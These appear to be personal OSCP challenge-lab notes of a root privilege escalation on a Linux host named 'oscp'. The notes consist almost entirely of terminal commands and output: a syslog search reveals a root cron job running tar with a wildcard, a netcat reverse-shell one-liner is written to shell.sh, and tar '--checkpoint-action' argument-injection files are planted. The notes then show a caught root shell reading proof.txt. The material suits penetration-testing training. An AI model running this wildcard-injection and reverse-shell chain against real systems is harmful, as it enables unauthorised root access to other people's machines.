cassie@oscp:/opt/admin$ grep "CRON" /var/log/syslog

grep "CRON" /var/log/syslog

Nov 11 06:24:09 oscp CRON\[1375\]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)

Nov 11 06:24:09 oscp CRON\[1374\]: (CRON) info (No MTA installed, discarding output)

Nov 11 06:25:01 oscp CRON\[1432\]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))

Nov 11 06:26:01 oscp CRON\[1444\]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)

Nov 11 06:26:01 oscp CRON\[1443\]: (CRON) info (No MTA installed, discarding output)

Nov 11 06:28:01 oscp CRON\[1571\]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)

Nov 11 06:28:01 oscp CRON\[1570\]: (CRON) info (No MTA installed, discarding output)

Nov 11 06:30:01 oscp CRON\[1587\]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)

Nov 11 06:30:01 oscp CRON\[1586\]: (CRON) info (No MTA installed, discarding output)

Nov 11 06:32:01 oscp CRON\[1592\]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)

Nov 11 06:32:01 oscp CRON\[1591\]: (CRON) info (No MTA installed, discarding output)

![[wt-priv image.png]]

cassie@oscp:/opt/admin$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.238 80 >/tmp/f"  > shell.sh

\<h -i 2>&1|nc 192.168.45.238 80 >/tmp/f"  > shell.sh

![[wt-priv image 1.png]]

cassie@oscp:/opt/admin$ touch -- "--checkpoint=1"

touch -- "--checkpoint=1"

cassie@oscp:/opt/admin$ touch -- "--checkpoint-action=exec=sh shell.sh"

touch -- "--checkpoint-action=exec=sh shell.sh"

![[wt-priv image 2.png]]

2分間待つ、、、

┌──(kali㉿kali)-\[~/…/PEN-200_OSCP+/ChallengeLab/OSCP_C/Charlie\]

└─$ rlwrap -cAr nc -lvnp 80

listening on \[any\] 80 ...

connect to \[192.168.45.238\] from (UNKNOWN) \[192.168.202.157\] 59124

sh: cannot set terminal process group (44712): Inappropriate ioctl for device

sh: no job control in this shell

sh-5.1# id

id

uid=0(root) gid=0(root) groups=0(root)

sh-5.1# cd /root

cd /root

sh-5.1# ls

ls

proof.txt

snap

sh-5.1# cat proof.txt

cat proof.txt

bffb1d0e03c14f1109729a7afe9b9d8c

sh-5.1# ifconfig

ifconfig

ens160: flags=4163\<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500

inet 192.168.202.157  netmask 255.255.255.0  broadcast 192.168.202.255

ether 00:50:56:ab:b1:10  txqueuelen 1000  (Ethernet)

RX packets 30224  bytes 3049846 (3.0 MB)

RX errors 0  dropped 1053  overruns 0  frame 0

TX packets 2003  bytes 1331309 (1.3 MB)

TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73\<UP,LOOPBACK,RUNNING>  mtu 65536

inet 127.0.0.1  netmask 255.0.0.0

loop  txqueuelen 1000  (Local Loopback)

RX packets 666  bytes 54350 (54.3 KB)

RX errors 0  dropped 0  overruns 0  frame 0

TX packets 666  bytes 54350 (54.3 KB)

TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

sh-5.1#

![[wt-priv image 3.png]]